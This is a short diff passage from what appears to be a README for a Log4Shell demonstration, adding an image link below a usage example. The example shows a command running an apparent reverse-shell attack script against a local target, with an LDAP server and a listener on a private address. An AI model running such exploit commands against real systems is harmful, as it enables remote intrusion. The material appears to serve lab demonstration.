@@ -36,3 +36,5 @@ For example:
 ```bash
 ./attack-revers.sh localhost:8080 192.168.50.100:1389 192.168.50.100:5555
 ```
+
+![](./log4shell.png)
